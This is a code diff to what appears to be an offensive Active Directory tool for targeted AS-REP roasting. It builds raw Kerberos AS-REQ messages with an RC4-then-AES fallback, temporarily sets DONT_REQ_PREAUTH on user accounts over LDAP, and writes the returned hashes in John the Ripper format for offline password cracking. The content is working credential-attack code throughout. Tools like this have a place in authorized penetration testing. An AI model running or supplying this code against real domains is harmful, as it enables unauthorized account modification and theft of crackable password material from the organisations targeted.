@@ -6,17 +6,20 @@
 
 import argparse, sys
 import os
+import datetime
+import random
 import ssl
 import traceback
 from binascii import hexlify, unhexlify
 
 import ldap3
-from pyasn1.codec.der import decoder
+from pyasn1.codec.der import decoder, encoder
+from pyasn1.type.univ import noValue
 from impacket.krb5 import constants
-from impacket.krb5.asn1 import AS_REP
-from impacket.krb5.types import Principal
+from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
+from impacket.krb5.kerberosv5 import sendReceive, KerberosError
+from impacket.krb5.types import KerberosTime, Principal
 from impacket.krb5.ccache import CCache
-from impacket.krb5.kerberosv5 import getKerberosTGT
 from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
 from impacket.smbconnection import SMBConnection
 
@@ -300,9 +303,62 @@ def get_users(ldap_session, domain, usernames=None):
 def obtain_asrep_hash(sAMAccountName, target_domain, kdc_host):
     try:
         client = Principal(sAMAccountName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        tgt, _, _, _ = getKerberosTGT(client, '', target_domain, b'', b'', kdcHost=kdc_host,
-                                      kerberoast_no_preauth=True)
-        as_rep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
+        domain = target_domain.upper()
+
+        def build_request(encryption_types):
+            as_req = AS_REQ()
+            as_req['pvno'] = 5
+            as_req['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+            as_req['padata'] = noValue
+            as_req['padata'][0] = noValue
+            as_req['padata'][0]['padata-type'] = int(
+                constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value
+            )
+            pac_request = KERB_PA_PAC_REQUEST()
+            pac_request['include-pac'] = True
+            as_req['padata'][0]['padata-value'] = encoder.encode(pac_request)
+
+            req_body = seq_set(as_req, 'req-body')
+            req_body['kdc-options'] = constants.encodeFlags([
+                constants.KDCOptions.forwardable.value,
+                constants.KDCOptions.renewable.value,
+                constants.KDCOptions.proxiable.value,
+            ])
+            server = Principal('krbtgt/%s' % domain,
+                               type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+            seq_set(req_body, 'sname', server.components_to_asn1)
+            seq_set(req_body, 'cname', client.components_to_asn1)
+            req_body['realm'] = domain
+            now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
+            req_body['till'] = KerberosTime.to_asn1(now)
+            req_body['rtime'] = KerberosTime.to_asn1(now)
+            req_body['nonce'] = random.getrandbits(31)
+            seq_set_iter(req_body, 'etype', encryption_types)
+            return encoder.encode(as_req)
+
+        # Match Impacket GetNPUsers: request RC4 first, then retry with AES
+        # only when the KDC explicitly reports that RC4 is unsupported.
+        try:
+            response = sendReceive(
+                build_request((int(constants.EncryptionTypes.rc4_hmac.value),)),
+                domain, kdc_host
+            )
+        except KerberosError as error:
+            if error.getErrorCode() != constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+                raise
+            aes_types = (
+                int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
+                int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
+            )
+            response = sendReceive(build_request(aes_types), domain, kdc_host)
+
+        try:
+            decoder.decode(response, asn1Spec=KRB_ERROR())[0]
+        except Exception:
+            as_rep = decoder.decode(response, asn1Spec=AS_REP())[0]
+        else:
+            raise Exception('KDC returned an error instead of an AS-REP')
+
         etype = int(as_rep['enc-part']['etype'])
         cipher = as_rep['enc-part']['cipher'].asOctets()
         if etype in (17, 18):
@@ -343,7 +399,6 @@ def set_uac_bit(ldap_session, dn, enabled):
 
 def handle_result(filename, result, user):
     if result is not None:
-        # Keep targetedKerberoast's output convention for John mode.
         if args.output_format == 'john':
             result = user + ':' + result
         if filename is not None and filename != '':
@@ -483,7 +538,7 @@ def main_asreproast():
                 logger.info('Setting DONT_REQ_PREAUTH temporarily for (%s)' % username)
                 handle_result(args.output_file, obtain_asrep_hash(username, domain, args.dc_ip), username)
             except Exception as target_error:
-                # Match targetedKerberoast: insufficient rights are expected per-object and debug-only.
+                # Match targetedAsreproast: insufficient rights are expected per-object and debug-only.
                 ldap_code = (ldap_session.result or {}).get('result')
                 if ldap_code == 50:
                     logger.debug('Could not modify (%s), the server reports insufficient rights' % username)
